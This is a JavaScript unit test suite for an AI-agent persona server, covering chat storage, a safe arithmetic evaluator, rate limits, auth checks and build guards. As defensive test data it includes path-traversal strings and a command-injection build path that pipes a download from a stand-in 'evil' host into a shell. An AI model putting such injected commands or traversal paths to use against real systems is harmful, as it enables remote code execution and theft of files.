// Unit suite — pure functions in isolation, no server, no network. The
// deterministic core the whole product's honesty rests on: the safe arithmetic
// evaluator, the checker engine, the Persona+ compilers, the schema builders,
// scheduler due/grace math, and the timing-safe token compare.
import assert from 'node:assert';
import { appendFileSync, utimesSync } from 'node:fs';
import {
  safeArith, runCheckers, upsertPersona, upsertCommand, compilePersona,
  compileCommand, templateSchema, toolSchema, listPersonas, deletePersona, unsafeRegex,
} from '../server/src/personas.js';
import { _testInternals as ROUT } from '../server/src/routines.js';
import { _testInternals as AUTH } from '../server/src/auth.js';
import { runBuild } from '../server/src/build.js';
import { appendChat, readChat, listChats, deleteChat, validId, MAX_TEXT, chatUsage, archiveChats, resolveTarget, listProjects, _testInternals as CHATLOG } from '../server/src/chatlog.js';
import { agentStatus, agentBinaries } from '../server/src/agents.js';
import { draftPrompt, normaliseDraft, previewCompiled } from '../server/src/personaDraft.js';
import {
  checkPeerMessage, recordPeerMessage, clearBacklog, resetPeerLimits, peerLimitState,
  RATE_MAX, RATE_WINDOW_MS, DEDUP_WINDOW_MS, MAX_BACKLOG, MAX_HOPS,
} from '../server/src/peerlimit.js';

let pass = 0, fail = 0;
function test(name, fn) {
  try { fn(); pass++; console.log(`  ✓ ${name}`); }
  catch (err) { fail++; console.log(`  ✗ ${name} — ${err.message}`); }
}

console.log('UNIT SUITE');

// ── chat transcripts: the id is untrusted and becomes a path ──
// A refresh used to delete the conversation, so these now persist. The id
// arrives from the client, which makes it the same class of input guards.js
// exists for — every test below that rejects something is rejecting a path.
test('validId accepts a normal generated id', () => {
  assert.ok(validId('cm2x8q1a-9fz3kd'));
  assert.ok(validId('a1b2c3d4'));
});
test('validId REFUSES traversal, separators and absolute paths', () => {
  for (const bad of ['../../.keys.enc', 'a/../../etc/passwd', '/etc/passwd', 'a/b', 'a\\b',
    'c:\\x', 'aaaaaaa\u0000b', '.hidden-file', '-leading-dash']) {
    assert.strictEqual(validId(bad), null, `accepted ${JSON.stringify(bad)}`);
  }
});
test('validId REFUSES the wrong shape rather than trimming it', () => {
  assert.strictEqual(validId('short'), null, 'too short');
  assert.strictEqual(validId('A'.repeat(12)), null, 'uppercase is not the generated shape');
  assert.strictEqual(validId('x'.repeat(41)), null, 'too long');
  assert.strictEqual(validId(''), null);
  assert.strictEqual(validId(null), null);
  assert.strictEqual(validId({ toString: () => '../etc' }), null);
});
test('a transcript round-trips, oldest first', () => {
  const id = 'unittest-roundtrip1';
  deleteChat(id);
  assert.ok(appendChat(id, { role: 'user', text: 'first question' }));
  assert.ok(appendChat(id, { role: 'claude', text: 'an answer', engine: 'Claude' }));
  const msgs = readChat(id);
  assert.strictEqual(msgs.length, 2);
  assert.strictEqual(msgs[0].role, 'user');
  assert.strictEqual(msgs[0].text, 'first question');
  assert.strictEqual(msgs[1].engine, 'Claude');
  assert.ok(msgs[1].at > 0, 'every message carries a timestamp');
  deleteChat(id);
});
test('an invalid id writes NOTHING — it never falls back to a default path', () => {
  assert.strictEqual(appendChat('../escape', { role: 'user', text: 'x' }), false);
  assert.strictEqual(appendChat('', { role: 'user', text: 'x' }), false);
  assert.deepStrictEqual(readChat('../escape'), []);
});
test('empty and whitespace-only turns are not stored', () => {
  const id = 'unittest-emptyturns';
  deleteChat(id);
  assert.strictEqual(appendChat(id, { role: 'user', text: '   ' }), false);
  assert.strictEqual(appendChat(id, { role: 'user', text: '' }), false);
  assert.deepStrictEqual(readChat(id), []);
});
test('an oversized paste is capped, not refused — the turn still happened', () => {
  const id = 'unittest-bigpaste00';
  deleteChat(id);
  appendChat(id, { role: 'user', text: 'z'.repeat(MAX_TEXT * 2) });
  const [m] = readChat(id);
  assert.strictEqual(m.text.length, MAX_TEXT);
  deleteChat(id);
});
test('a torn final line costs one message, never the file', () => {
  // The failure mode JSONL is chosen for: a phone losing power mid-append.
  const id = 'unittest-tornwrite1';
  deleteChat(id);
  appendChat(id, { role: 'user', text: 'survivor' });
  appendFileSync(CHATLOG.fileFor(id), '{"at":1,"role":"claude","text":"trunc');
  const msgs = readChat(id);
  assert.strictEqual(msgs.length, 1, 'the intact message must still be readable');
  assert.strictEqual(msgs[0].text, 'survivor');
  deleteChat(id);
});
// ── Persona+ drafting: models return JSON that is ALMOST right ──
test('a draft survives fences and prose around the JSON', () => {
  // Every engine does this differently and none of them is wrong. Refusing a
  // fenced reply would make the feature feel broken for a reason the user can
  // neither see nor fix.
  const r = normaliseDraft('Sure!\n```json\n{"name":"X","focus":"y"}\n```');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.draft.name, 'X');
});
test('a draft coerces the shape instead of throwing', () => {
  const r = normaliseDraft({ name: 'Hawk', focus: 'errors', skills: 'try/catch, retries', profile: 'nonsense' });
  assert.deepStrictEqual(r.draft.skills, ['try/catch', 'retries'], 'a string list becomes a list');
  assert.strictEqual(r.draft.profile, 'scout', 'an unknown profile falls back to the LEAST powerful one');
});
test('a draft REPORTS what upsertPersona would refuse, rather than throwing it', () => {
  // name and focus are the two the store rejects on. Reporting them lets the UI
  // show a filled form with the gaps marked — throwing would show an error and
  // lose the rest of the draft the user could have kept.
  const r = normaliseDraft({ name: 'NoFocus' });
  assert.strictEqual(r.ok, true);
  assert.deepStrictEqual(r.missing, ['focus']);
});
test('prose with no object is refused, not guessed at', () => {
  const r = normaliseDraft('I think a good persona would review code.');
  assert.strictEqual(r.ok, false);
  assert.match(r.error, /did not return a JSON object/);
});
test('the drafting prompt names FOCUS as the field that matters', () => {
  // Scope is the moat — upsertPersona refuses without it, and a vague focus is
  // what makes a persona useless rather than merely imperfect.
  const p = draftPrompt('a reviewer that is brutal about error handling');
  assert.match(p, /FOCUS is the scope limit/);
  assert.match(p, /brutal about error handling/, 'the request must reach the engine verbatim');
  assert.match(p, /ONLY a JSON object/);
});
test('a draft can be compiled without being saved', () => {
  const { draft } = normaliseDraft({ name: 'Hawk', focus: 'errors only', bio: 'b', instructions: 'i' });
  assert.match(previewCompiled(draft), /PERSONA: Hawk/);
  assert.ok(!listPersonas().some((p) => p.name === 'Hawk'), 'drafting must never write to the store');
});

test('an ARCHIVED conversation is still listed and still opens', () => {
  // The whole difference between archiving and deleting. If archiving removed a
  // row from the list, or made it unopenable without a shell, it would be
  // deletion with a friendlier name.
  const id = 'unittest-archiveme1';
  deleteChat(id);
  appendChat(id, { role: 'user', text: 'archive me and give me back' });
  appendChat(id, { role: 'claude', text: 'ok', engine: 'Claude' });
  const r = archiveChats({ keepNewest: 0 });
  assert.ok(r.archived >= 1, 'the conversation should have been archived');
  assert.ok(r.file, 'an archive file must be written');

  const row = listChats().find((c) => c.id === id);
  assert.ok(row, 'an archived conversation must still appear in the list');
  assert.strictEqual(row.archived, true, 'and must say that it is archived');
  assert.strictEqual(row.title, 'archive me and give me back');

  const msgs = readChat(id);
  assert.strictEqual(msgs.length, 2, 'and must open with its messages intact');
  assert.strictEqual(msgs[0].text, 'archive me and give me back');
});
test('nothing is archived when nothing matches, and nothing is removed', () => {
  const before = listChats().length;
  const r = archiveChats({ olderThanMs: 0 });
  assert.strictEqual(r.archived, 0);
  assert.strictEqual(listChats().length, before, 'a no-op archive must not touch the store');
});
// ── runaway control on chat-to-chat messages ──
// A person sends one message. Two agents given the same ability answer each
// other, and every answer is a real turn: tokens, a spawned CLI, a phone kept
// awake. These four limits each stop a different runaway, and the clock is
// injected so none of these tests sleep.
test('rate limit: the same sender cannot hammer one conversation', () => {
  resetPeerLimits();
  const now = 1_000_000;
  for (let i = 0; i < RATE_MAX; i++) {
    const g = checkPeerMessage({ from: 'a', to: 'b', text: `m${i}`, now });
    assert.strictEqual(g.ok, true, `message ${i} should pass`);
    recordPeerMessage({ from: 'a', to: 'b', text: `m${i}`, now });
  }
  const over = checkPeerMessage({ from: 'a', to: 'b', text: 'one too many', now });
  assert.strictEqual(over.ok, false);
  assert.match(over.reason, /a minute to the same conversation/);
});
test('rate limit is PER PAIR — a different recipient is unaffected', () => {
  resetPeerLimits();
  const now = 2_000_000;
  for (let i = 0; i < RATE_MAX; i++) recordPeerMessage({ from: 'a', to: 'b', text: `m${i}`, now });
  assert.strictEqual(checkPeerMessage({ from: 'a', to: 'c', text: 'hello', now }).ok, true,
    'throttling a->b must not throttle a->c');
  assert.strictEqual(checkPeerMessage({ from: 'z', to: 'b', text: 'hello', now }).ok, true,
    'throttling a->b must not throttle z->b');
});
test('rate limit expires — the window slides, it is not a permanent ban', () => {
  resetPeerLimits();
  const now = 3_000_000;
  for (let i = 0; i < RATE_MAX; i++) recordPeerMessage({ from: 'a', to: 'b', text: `m${i}`, now });
  assert.strictEqual(checkPeerMessage({ from: 'a', to: 'b', text: 'x', now }).ok, false);
  assert.strictEqual(checkPeerMessage({ from: 'a', to: 'b', text: 'x', now: now + RATE_WINDOW_MS + 1 }).ok, true);
});
test('dedup: identical text is dropped, and says so specifically', () => {
  resetPeerLimits();
  const now = 4_000_000;
  recordPeerMessage({ from: 'a', to: 'b', text: 'are you done yet', now });
  const again = checkPeerMessage({ from: 'a', to: 'b', text: 'are you done yet', now: now + 1000 });
  assert.strictEqual(again.ok, false);
  assert.match(again.reason, /identical/, 'a stuck agent must get the accurate reason, not a generic "too many"');
  // Different text from the same sender is fine.
  assert.strictEqual(checkPeerMessage({ from: 'a', to: 'b', text: 'something else', now: now + 1000 }).ok, true);
  // And the same text is allowed again once the window passes.
  assert.strictEqual(checkPeerMessage({ from: 'a', to: 'b', text: 'are you done yet', now: now + DEDUP_WINDOW_MS + 1 }).ok, true);
});
test('backlog: messages stop piling into a conversation nobody is reading', () => {
  resetPeerLimits();
  let now = 5_000_000;
  // Spread across senders so the per-pair rate limit is not what trips.
  for (let i = 0; i < MAX_BACKLOG; i++) {
    recordPeerMessage({ from: `sender${i}`, to: 'dormant', text: `m${i}`, live: false, now: now + i });
  }
  const over = checkPeerMessage({ from: 'someone-new', to: 'dormant', text: 'hello', live: false, now });
  assert.strictEqual(over.ok, false);
  assert.match(over.reason, /unread messages are already waiting/);
});
test('backlog does NOT apply to a conversation someone is reading', () => {
  resetPeerLimits();
  const now = 6_000_000;
  for (let i = 0; i < MAX_BACKLOG + 10; i++) {
    recordPeerMessage({ from: `s${i}`, to: 'watched', text: `m${i}`, live: true, now: now + i });
  }
  assert.strictEqual(checkPeerMessage({ from: 'new', to: 'watched', text: 'hi', live: true, now }).ok, true,
    'throttling mail a human can see on screen is breakage, not safety');
});
test('opening a conversation clears its backlog', () => {
  resetPeerLimits();
  const now = 7_000_000;
  for (let i = 0; i < MAX_BACKLOG; i++) recordPeerMessage({ from: `s${i}`, to: 'inbox', text: `m${i}`, live: false, now });
  assert.strictEqual(checkPeerMessage({ from: 'x', to: 'inbox', text: 'hi', live: false, now }).ok, false);
  clearBacklog('inbox');
  assert.strictEqual(checkPeerMessage({ from: 'x', to: 'inbox', text: 'hi', live: false, now }).ok, true);
});
test('hop limit stops a RING, which the per-pair limits cannot', () => {
  // A->B, B->C, C->A defeats every per-pair limit: no pair repeats. Depth is
  // the only thing that catches it, and it is why the counter exists before
  // anything relays automatically.
  resetPeerLimits();
  assert.strictEqual(checkPeerMessage({ from: 'a', to: 'b', text: 'x', hops: 0 }).ok, true);
  assert.strictEqual(checkPeerMessage({ from: 'b', to: 'c', text: 'x', hops: MAX_HOPS - 1 }).ok, true);
  const ring = checkPeerMessage({ from: 'c', to: 'a', text: 'x', hops: MAX_HOPS });
  assert.strictEqual(ring.ok, false);
  assert.match(ring.reason, /looks like a loop/);
});
test('a REFUSED message never counts against the sender', () => {
  // check and record are separate on purpose: if a refusal incremented the
  // counter, one blocked message would extend its own ban.
  resetPeerLimits();
  const now = 8_000_000;
  for (let i = 0; i < 3; i++) checkPeerMessage({ from: 'a', to: 'b', text: `m${i}`, now });
  assert.strictEqual(peerLimitState().pairs, 0, 'checking must not record');
});

test('a conversation can be addressed by its PROJECT, not just its id', () => {
  // Nobody thinks in conversation ids. "Tell whoever is working on auth" is the
  // thing people actually mean, so a project resolves to a conversation.
  const a = 'unittest-projaddr01';
  const b = 'unittest-projaddr02';
  deleteChat(a); deleteChat(b);
  appendChat(a, { role: 'user', text: 'older one here', cwd: '/projects/auth' });
  appendChat(b, { role: 'user', text: 'newer one here', cwd: '/projects/auth' });
  // Recency is mtime, and two appends land in the same millisecond — so the
  // times are set explicitly rather than hoping the filesystem separates them.
  // Hoping is how a test passes on a slow machine and fails on a fast one.
  const t = Date.now() / 1000;
  utimesSync(CHATLOG.fileFor(a), t - 60, t - 60);
  utimesSync(CHATLOG.fileFor(b), t, t);

  const newest = resolveTarget({ project: '/projects/auth' });
  assert.strictEqual(newest.id, b, 'with nobody live, the most recent conversation wins');
  assert.match(newest.why, /most recent/);

  // A LIVE conversation outranks a newer dormant one: a message to a project
  // means "tell whoever is working on this", and that is the person with it open.
  const live = resolveTarget({ project: '/projects/auth', isLive: (id) => id === a });
  assert.strictEqual(live.id, a, 'a live conversation outranks a more recent dormant one');
  assert.match(live.why, /live/);

  // An explicit id always wins over a project.
  assert.strictEqual(resolveTarget({ to: a, project: '/projects/auth' }).id, a);
  // And an unknown project resolves to nothing, with a reason worth showing.
  const none = resolveTarget({ project: '/projects/nope' });
  assert.strictEqual(none.id, null);
  assert.match(none.why, /no conversation has run in/);
  deleteChat(a); deleteChat(b);
});
test('listProjects groups conversations by where they ran', () => {
  const id = 'unittest-projlist01';
  deleteChat(id);
  appendChat(id, { role: 'user', text: 'in a project', cwd: '/projects/widget' });
  const row = listProjects().find((p) => p.project === '/projects/widget');
  assert.ok(row, 'the project must appear');
  assert.strictEqual(row.name, 'widget', 'the display name is the last path segment');
  deleteChat(id);
});
test('chatUsage REPORTS and never acts', () => {
  const u = chatUsage();
  assert.ok(typeof u.bytes === 'number' && u.bytes >= 0);
  assert.ok(typeof u.suggestArchive === 'boolean');
  // A suggestion carries its reason, so the prompt can say WHY rather than
  // demanding the user trust a threshold they cannot see.
  if (u.suggestArchive) assert.ok(u.reason, 'a suggestion must name its reason');
  else assert.strictEqual(u.reason, null);
});
test('every agent engine the Doctor can AUTH-check, it can also BIN-check', () => {
  // Two lists that must name the same engines: agentStatus() answers "is there a
  // credential", agentBinaries() answers "will it run". An engine present in one
  // and missing from the other is exactly the silent half-configured state the
  // Doctor pane exists to surface, so it must not be possible to add one alone.
  const statusIds = agentStatus().map((a) => a.id).sort();
  const binIds = agentBinaries().map((b) => b.id).sort();
  assert.deepStrictEqual(binIds, statusIds);
  for (const b of agentBinaries()) assert.ok(b.cmd && typeof b.cmd === 'string', `${b.id} resolves no command`);
});
test('listChats titles a conversation by its first USER message', () => {
  // Titling by the first message full stop made every row read the same, because
  // an assistant often opens with a tool preamble.
  const id = 'unittest-titlerow1';
  deleteChat(id);
  appendChat(id, { role: 'claude', text: 'Reading files…', engine: 'Claude' });
  appendChat(id, { role: 'user', text: 'why is the ladder not a line?' });
  const row = listChats().find((c) => c.id === id);
  assert.ok(row, 'the conversation must appear in the list');
  assert.strictEqual(row.title, 'why is the ladder not a line?');
  assert.ok(row.bytes > 0, 'the row carries size, which is free from stat');
  assert.ok(!('count' in row), 'a message count cannot be known without reading everything — the list must not pretend');
  deleteChat(id);
  assert.ok(!listChats().some((c) => c.id === id), 'delete must actually remove it');
});

// ── safeArith: the tier-2 arithmetic checker's engine ──
test('safeArith does basic precedence', () => {
  assert.equal(safeArith('2+3*4', {}), 14);
  assert.equal(safeArith('(2+3)*4', {}), 20);
});
test('safeArith resolves scope variables', () => {
  assert.equal(safeArith('qty*unit_price', { qty: 3, unit_price: 10 }), 30);
  assert.ok(Math.abs(safeArith('qty*price*(1+markup)', { qty: 2, price: 100, markup: 0.1 }) - 220) < 1e-9);
});
test('safeArith handles unary minus', () => assert.equal(safeArith('-5+8', {}), 3));
test('safeArith REJECTS code injection (no eval reachable)', () => {
  assert.throws(() => safeArith('process.exit(1)', {}));
  assert.throws(() => safeArith('constructor', {}));
  assert.throws(() => safeArith('1;drop', {}));
  assert.throws(() => safeArith('a()', { a: 1 }));
});
test('safeArith fails on unknown identifier, not silently 0', () => {
  assert.throws(() => safeArith('mystery+1', {}));
});
test('safeArith rejects unbalanced parens + trailing tokens', () => {
  assert.throws(() => safeArith('(2+3', {}));
  assert.throws(() => safeArith('2+3)', {}));
  assert.throws(() => safeArith('2 3', {}));
});

// ── checkers: tier-1 shape + tier-2 assertions ──
const CMD = {
  fields: [
    { name: 'category', type: 'string' }, { name: 'parts', type: 'array' },
    { name: 'total', type: 'number' }, { name: 'note', type: 'string' },
  ],
  checkers: [
    { kind: 'enum', field: 'category', values: ['washer', 'dryer'] },
    { kind: 'subset-of-var', field: 'parts', ofVar: 'stock' },
    { kind: 'arith', field: 'total', formula: 'qty*price', tolerance: 0.01 },
    { kind: 'not-empty', field: 'note' },
  ],
};
test('checkers pass a fully valid answer', () => {
  const v = runCheckers(CMD, { category: 'washer', parts: ['pump'], total: 20, note: 'ok' }, { stock: 'pump, belt', qty: 4, price: 5 });
  assert.ok(v.passed, JSON.stringify(v.results.filter((r) => !r.ok)));
  assert.match(v.tier3, /semantic/);
});
test('tier-1 catches a wrong type', () => {
  const v = runCheckers(CMD, { category: 'washer', parts: 'not-an-array', total: 20, note: 'ok' }, { stock: 'pump', qty: 4, price: 5 });
  assert.ok(!v.passed);
  assert.ok(v.results.some((r) => r.tier === 1 && !r.ok && r.check.includes('parts')));
});
test('enum checker rejects an off-list value', () => {
  const v = runCheckers(CMD, { category: 'spaceship', parts: [], total: 20, note: 'x' }, { stock: '', qty: 4, price: 5 });
  assert.ok(v.results.some((r) => r.check.includes('category') && !r.ok));
});
test('subset-of-var catches an invented part', () => {
  const v = runCheckers(CMD, { category: 'washer', parts: ['flux capacitor'], total: 20, note: 'x' }, { stock: 'pump, belt', qty: 4, price: 5 });
  const r = v.results.find((x) => x.check.includes('parts') && x.tier === 2);
  assert.ok(!r.ok && /flux/.test(r.got));
});
// REGRESSION (peer review 2026-07-22): subset-of-var must be EXACT membership,
// not substring — "concatenate" must NOT pass for allowed "cat".
test('subset-of-var rejects a substring stray (concatenate ⊄ [cat])', () => {
  const cmd = { fields: [{ name: 'parts', type: 'array' }], checkers: [{ kind: 'subset-of-var', field: 'parts', ofVar: 'stock' }] };
  const bad = runCheckers(cmd, { parts: ['concatenate'] }, { stock: 'cat, dog' });
  assert.ok(!bad.passed, 'substring stray wrongly passed');
  const good = runCheckers(cmd, { parts: ['cat'] }, { stock: 'cat, dog' });
  assert.ok(good.passed, 'exact member wrongly rejected');
});
test('arith checker catches a math error with the expected value', () => {
  const v = runCheckers(CMD, { category: 'washer', parts: [], total: 999, note: 'x' }, { stock: '', qty: 4, price: 5 });
  const r = v.results.find((x) => x.tier === 2 && x.check.includes('total'));
  assert.ok(!r.ok && r.got.includes('20'), JSON.stringify(r));
});
test('not-empty catches blank + whitespace', () => {
  const v = runCheckers(CMD, { category: 'washer', parts: [], total: 20, note: '   ' }, { stock: '', qty: 4, price: 5 });
  assert.ok(v.results.some((r) => r.check.includes('note') && !r.ok));
});

// ── Persona+ compilers ──
test('compilePersona emits FOCUS, NO_NOS, scope guard', () => {
  const s = compilePersona({ name: 'X', focus: 'only Y', no_nos: ['never Z'], skills: ['A'] });
  assert.match(s, /FOCUS: only Y/);
  assert.match(s, /never Z/);
  assert.match(s, /out of scope/i);
});
test('templateSchema is strict JSON-schema of the TEMPLATE', () => {
  const s = templateSchema(CMD);
  assert.equal(s.additionalProperties, false);
  assert.deepEqual(s.required.sort(), ['category', 'note', 'parts', 'total']);
  assert.equal(s.properties.parts.type, 'array');
  assert.equal(s.properties.total.type, 'number');
});
test('toolSchema maps VARIABLES to typed params w/ required set', () => {
  const cmd = { name: 'REQ', focus: 'f', variables: [
    { name: 'a', type: 'string', required: true }, { name: 'b', type: 'number', required: false },
    { name: 'c', type: 'enum', values: ['x', 'y'], required: true },
  ] };
  const t = toolSchema(cmd);
  assert.deepEqual(t.input_schema.required.sort(), ['a', 'c']);
  assert.deepEqual(t.input_schema.properties.c.enum, ['x', 'y']);
  assert.equal(t.input_schema.properties.b.type, 'number');
});
test('compileCommand injects variable values into the REQUEST', () => {
  const cmd = { name: 'REQ', focus: 'f', variables: [{ name: 'city', type: 'string' }], fields: [{ name: 'out', type: 'string' }] };
  assert.match(compileCommand(cmd, { city: 'Baltimore' }), /Baltimore/);
});

// ── validation guards ──
test('upsertPersona requires NAME and FOCUS', () => {
  assert.throws(() => upsertPersona({ name: '', focus: 'x' }));
  assert.throws(() => upsertPersona({ name: 'x', focus: '' }));
});
test('upsertCommand requires at least one TEMPLATE field', () => {
  assert.throws(() => upsertCommand({ name: 'R', fields: [] }));
});
// REGRESSION (adversarial agent, 2026-07-20): an invalid checker must be a
// HARD ERROR, never silently dropped — a vanished guardrail green-lights the
// harness with no tier-2 checks and nobody knows.
test('upsertCommand REJECTS a checker pointing at a nonexistent field', () => {
  assert.throws(() => upsertCommand({ name: 'R', fields: [{ name: 'a', type: 'string' }], checkers: [{ kind: 'enum', field: 'ghost', values: ['x'] }] }), /no TEMPLATE field named "ghost"/);
});
test('upsertCommand REJECTS an invalid regex checker (not silent drop)', () => {
  assert.throws(() => upsertCommand({ name: 'R2', fields: [{ name: 'a', type: 'string' }], checkers: [{ kind: 'regex', field: 'a', pattern: '(' }] }), /invalid regex/);
});
test('upsertCommand REJECTS an unknown checker kind', () => {
  assert.throws(() => upsertCommand({ name: 'R3', fields: [{ name: 'a', type: 'string' }], checkers: [{ kind: 'vibes', field: 'a' }] }), /unknown kind/);
});
test('upsertCommand REJECTS subset-of-var pointing at a nonexistent variable', () => {
  assert.throws(() => upsertCommand({ name: 'R4', fields: [{ name: 'a', type: 'array' }], variables: [], checkers: [{ kind: 'subset-of-var', field: 'a', ofVar: 'ghost' }] }), /no VARIABLE named/);
});
test('upsertCommand REJECTS an unparseable arith formula', () => {
  assert.throws(() => upsertCommand({ name: 'R5', fields: [{ name: 't', type: 'number' }], checkers: [{ kind: 'arith', field: 't', formula: 'process.exit(1)' }] }));
});
test('a valid checker set still saves fine', () => {
  const c = upsertCommand({ name: 'R6', fields: [{ name: 't', type: 'number' }], variables: [{ name: 'qty', type: 'number' }, { name: 'p', type: 'number' }], checkers: [{ kind: 'arith', field: 't', formula: 'qty*p' }] });
  assert.equal(c.checkers.length, 1);
});

// REGRESSION: a divide-by-zero (Infinity) formula must FAIL the check, not pass
// vacuously (adversarial agent, 2026-07-20).
test('arith with an Infinity expected value FAILS, never passes vacuously', () => {
  const cmd = { fields: [{ name: 'total', type: 'number' }], checkers: [{ kind: 'arith', field: 'total', formula: 'qty/zero', tolerance: 0.01 }] };
  const v = runCheckers(cmd, { total: 5 }, { qty: 3, zero: 0 });
  const r = v.results.find((x) => x.tier === 2);
  assert.ok(!r.ok && /not a finite number/.test(r.got), JSON.stringify(r));
  assert.ok(!v.passed);
});

// REGRESSION: checker constraints must appear in the compiled prompt so the
// model can see the rules it's graded against (adversarial agent, 2026-07-20).
test('compileCommand surfaces enum/arith constraints to the model', () => {
  const cmd = {
    name: 'REQ', focus: 'f',
    variables: [{ name: 'qty', type: 'number' }, { name: 'p', type: 'number' }],
    fields: [{ name: 'category', type: 'string' }, { name: 'total', type: 'number' }],
    checkers: [{ kind: 'enum', field: 'category', values: ['washer', 'dryer'] }, { kind: 'arith', field: 'total', formula: 'qty*p', tolerance: 0.01 }],
  };
  const out = compileCommand(cmd, { qty: 2, p: 3 });
  assert.match(out, /CONSTRAINTS/);
  assert.match(out, /washer, dryer/);
  assert.match(out, /qty\*p/);
});

// ── scheduler math ──
test('every-N due = lastFire + interval', () => {
  const now = 1_000_000_000_000;
  const r = { cadence: { kind: 'every', minutes: 30 }, lastFireAt: now, createdAt: 0 };
  assert.equal(ROUT.dueAt(r), now + 30 * 60000);
});
test('every-N grace is half an interval; daily grace is 2h', () => {
  assert.equal(ROUT.graceMs({ cadence: { kind: 'every', minutes: 30 } }), 15 * 60000);
  assert.equal(ROUT.graceMs({ cadence: { kind: 'daily', at: '07:00' } }), 2 * 3600000);
});

// ── auth token compare ──
test('bearerOk rejects wrong length + wrong value', () => {
  // automation bearer (header only); we don't know the live value here.
  assert.equal(AUTH.bearerOk(''), false);
  assert.equal(AUTH.bearerOk(null), false);
  assert.equal(AUTH.bearerOk('short'), false);
});
test('a forged session token is invalid', () => {
  assert.equal(AUTH.sessionValid('f'.repeat(64)), false);
  assert.equal(AUTH.sessionValid(null), false);
});

// ── build path guard (RCE fix, 2026-07-22): the client-supplied build path
// must be validated + passed as cwd, never interpolated into a shell string ──
test('build guard — path outside PROJECTS_DIR is rejected (fails closed)', () => {
  const msgs = [];
  runBuild('/etc', (m) => msgs.push(m));
  assert.ok(msgs.some((m) => m.t === 'build.err'), 'expected build.err for out-of-root path');
});
test('build guard — shell-metacharacter path is rejected (RCE attempt fails closed)', () => {
  const msgs = [];
  runBuild('/root/p;curl${IFS}evil|sh', (m) => msgs.push(m));
  assert.ok(msgs.some((m) => m.t === 'build.err'), 'metachar path must be rejected, never spawned');
});

// ── ReDoS guard: catastrophic-backtracking regexes are rejected at authoring ──
test('unsafeRegex flags nested quantifiers (ReDoS shapes)', () => {
  for (const bad of ['(a+)+', '(a*)*', '(a+)*$', '((ab)+)+', '(\\d+)+', '(a+)+b']) {
    assert.equal(unsafeRegex(bad), true, `should flag ${bad}`);
  }
});
test('unsafeRegex allows normal patterns', () => {
  for (const ok of ['^\\d{3}-\\d{4}$', 'foo|bar', 'a+b*c?', '[a-z]+@[a-z]+', '(abc)+', '^v\\d+$']) {
    assert.equal(unsafeRegex(ok), false, `should allow ${ok}`);
  }
});
test('a checker with a catastrophic regex is REFUSED at authoring (hard error)', () => {
  assert.throws(() => upsertCommand({
    name: 'REDOS_TEST', fields: [{ name: 'f', type: 'string' }],
    checkers: [{ kind: 'regex', field: 'f', pattern: '(a+)+$' }],
  }), /ReDoS|nested quantifier|invalid checker/i);
});

// ── OS-sandbox opt-in (ATLAN_SANDBOX) ──
const { sandboxEnabled, sandboxOption } = await import('../server/src/config.js');
test('sandboxOption is undefined unless ATLAN_SANDBOX=1 (off by default)', () => {
  const prev = process.env.ATLAN_SANDBOX;
  delete process.env.ATLAN_SANDBOX;
  assert.equal(sandboxEnabled(), false);
  assert.equal(sandboxOption(), undefined);
  if (prev !== undefined) process.env.ATLAN_SANDBOX = prev;
});
test('ATLAN_SANDBOX=1 yields an enabled, honest-degrade sandbox option', () => {
  const prev = process.env.ATLAN_SANDBOX;
  process.env.ATLAN_SANDBOX = '1';
  assert.equal(sandboxEnabled(), true);
  // enabled + failIfUnavailable:false (degrade where bwrap can't start); NOT
  // autoAllowBashIfSandboxed — sandboxed Bash must still hit canUseTool (budget/profile).
  assert.deepEqual(sandboxOption(), { enabled: true, failIfUnavailable: false });
  if (prev === undefined) delete process.env.ATLAN_SANDBOX; else process.env.ATLAN_SANDBOX = prev;
});

// ── budget reservation: stop BEFORE a turn can overshoot (peer review) ──
const { _testInternals: FLEET } = await import('../server/src/fleet.js');
test('reserveFor caps at TURN_RESERVE for a large budget', () => {
  assert.equal(FLEET.reserveFor(150_000), FLEET.TURN_RESERVE); // 16k << 75k half
});
test('reserveFor never exceeds half the budget (small runs still work)', () => {
  assert.equal(FLEET.reserveFor(20_000), 10_000); // half of 20k < 16k reserve
  assert.equal(FLEET.reserveFor(1_000), 500);
});
test('budgetExhausted halts with headroom left — overshoot is bounded, not post-hoc', () => {
  // 150k budget, 16k reserve → new turns stop at 134k, leaving 16k for the
  // in-flight turn. The whole point: we halt BELOW the raw budget, so a single
  // big generation can't blow past it before we count it.
  assert.equal(FLEET.budgetExhausted(133_999, 150_000), false);
  assert.equal(FLEET.budgetExhausted(134_000, 150_000), true);
  assert.equal(FLEET.budgetExhausted(140_000, 150_000), true, 'still under raw budget but within reserve → must halt');
  assert.equal(FLEET.budgetExhausted(0, 150_000), false);
});

// ── first-run setup gate: only this device may claim setup (peer review) ──
const { setupAllowed, authToken, allowedOrigins } = await import('../server/src/auth.js');
test('setupAllowed: an allow-listed browser Origin passes (frictionless first run)', () => {
  assert.equal(setupAllowed({ headers: { origin: allowedOrigins()[0] } }), true);
});
test('setupAllowed: the local bearer passes with no Origin (scripted path)', () => {
  assert.equal(setupAllowed({ headers: { 'x-atlan-token': authToken() } }), true);
});
test('setupAllowed: no Origin + no bearer is REFUSED (the race vector we close)', () => {
  assert.equal(setupAllowed({ headers: {} }), false);
});
test('setupAllowed: a foreign Origin with no bearer is refused', () => {
  assert.equal(setupAllowed({ headers: { origin: 'http://evil.example' } }), false);
});

// ── resolveBrain: the agent-vs-brain classifier (S4) ──
// A synthetic roster keeps this a pure unit — no keys, no llama-server probe.
// The suite's test() is sync; these need await, so they get their own runner.
async function atest(name, fn) {
  try { await fn(); pass++; console.log(`  ✓ ${name}`); }
  catch (err) { fail++; console.log(`  ✗ ${name} — ${err.message}`); }
}
const { resolveBrain } = await import('../server/src/brains.js');
const ROSTER = [
  { id: 'local', label: 'On-device', model: 'qwen', ready: false },
  { id: 'gemini', label: 'Gemini', model: 'gemini-3.6-flash', ready: true },
  { id: 'openai', label: 'OpenAI', model: 'gpt-5.6', ready: true },
];
await atest('resolveBrain: a real brain id resolves to itself', async () => {
  const r = await resolveBrain('openai', null, ROSTER);
  assert.equal(r.provider, 'openai');
  assert.equal(r.fellBack, false);
});
await atest('resolveBrain: an explicit model overrides the roster default', async () => {
  assert.equal((await resolveBrain('openai', 'gpt-5.6-sol', ROSTER)).model, 'gpt-5.6-sol');
});
await atest('resolveBrain: agent ids fall back to a ready brain, not "unknown engine"', async () => {
  for (const agent of ['claude', 'codex', 'copilot', 'antigravity']) {
    const r = await resolveBrain(agent, null, ROSTER);
    assert.equal(r.provider, 'gemini', `${agent} did not fall back`);
